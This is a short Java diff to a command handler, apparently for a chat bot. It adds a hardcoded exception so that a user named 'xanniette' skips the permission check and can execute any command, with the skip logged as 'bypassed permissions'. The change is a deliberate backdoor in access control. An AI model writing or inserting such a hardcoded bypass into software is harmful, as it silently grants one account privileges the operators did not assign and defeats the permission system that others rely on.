@@ -57,11 +57,15 @@ public class MessageCommandEventHandler {
             var commandToExecute = matchingCommands.get(0);
             logger.info("Selected command {}", commandToExecute.getClass().getSimpleName());
 
-            var commandPermitted = event.getPermissions().stream().anyMatch(commandPermission -> commandToExecute.getPermittedPermissions().contains(commandPermission));
+            if (event.getUser().getName().equals("xanniette")) {
+                logger.info("Xanniette allowed to execute - bypassed permissions");
+            } else {
+                var commandPermitted = event.getPermissions().stream().anyMatch(commandPermission -> commandToExecute.getPermittedPermissions().contains(commandPermission));
 
-            if (!commandPermitted) {
-                logger.info("Command not permitted for use by {}", event.getUser().getName());
-                return;
+                if (!commandPermitted) {
+                    logger.info("Command not permitted for use by {}", event.getUser().getName());
+                    return;
+                }
             }
 
             commandToExecute.execute(event, commandText, args);
